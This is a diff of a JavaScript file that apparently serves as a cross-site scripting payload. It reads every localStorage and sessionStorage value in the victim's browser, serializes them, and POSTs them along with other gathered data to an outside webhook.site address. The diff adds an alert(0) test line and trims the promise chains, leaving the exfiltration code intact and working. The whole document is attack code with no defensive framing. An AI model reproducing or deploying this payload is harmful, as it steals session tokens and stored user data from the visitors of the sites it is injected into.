@@ -1,4 +1,5 @@
 
+alert(0);
 function getAllLocalStorageValues() {
   const allSessionData = {};
   for (let i = 0; i < localStorage.length; i++) {
@@ -7,7 +8,7 @@ function getAllLocalStorageValues() {
     allSessionData[key] = value;
   }
   return allSessionData;
-};
+}
 
 function getAllSessionStorageValues() {
   const allSessionData = {};
@@ -17,7 +18,7 @@ function getAllSessionStorageValues() {
     allSessionData[key] = value;
   }
   return allSessionData;
-};
+}
 
 const sessionData = JSON.stringify(getAllSessionStorageValues());
 const localData = JSON.stringify(getAllLocalStorageValues());
@@ -39,27 +40,14 @@ url = 'https://webhook.site/v2223';
       };
       xhr.send();
    })
-})();
+})()
 
 fetch(url, {
   method: 'POST',
   body: inner // Convert the JavaScript object to a JSON string
-})
-.then(response => {
-})
-.then(data => {
-})
-.catch(error => {
-});
+}).then(response => {});
 
 fetch(url, {
   method: 'POST',
   body: outer // Convert the JavaScript object to a JSON string
-})
-.then(response => {
-})
-.then(data => {
-})
-.catch(error => {
-});
-
+}).then(response => {});
